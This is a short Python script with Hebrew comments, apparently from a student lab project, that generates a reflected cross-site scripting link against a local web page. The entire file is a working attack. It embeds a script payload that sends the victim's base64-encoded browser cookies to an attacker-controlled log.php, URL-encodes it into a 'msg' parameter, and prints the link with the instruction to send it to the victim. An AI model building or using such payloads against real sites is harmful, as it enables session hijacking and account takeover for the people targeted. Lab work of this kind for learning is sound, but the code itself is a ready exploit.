import urllib.parse

TARGET_IP = "192.168.56.1"
TARGET_URL = f"http://{TARGET_IP}/CyberProject/home.php"

# הכתובת של התוקף (לאן המידע יישלח) אולי לשנות לכתובת שיש לניצן או לנועם כדי להראות מ2 מחשבים שונים
ATTACKER_IP = "192.168.56.1"

# ה-Payload: גניבת עוגיות ושליחתן ל-log.php
js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/log.php?data=' + btoa(document.cookie);</script>"

encoded_payload = urllib.parse.quote(js_payload)
malicious_link = f"{TARGET_URL}?msg={encoded_payload}"

print("="*60)
print(f"[!] Network XSS Payload Generated (Target: {TARGET_IP})")
print("="*60)
print(f"\nSend this link to the victim:\n\n{malicious_link}")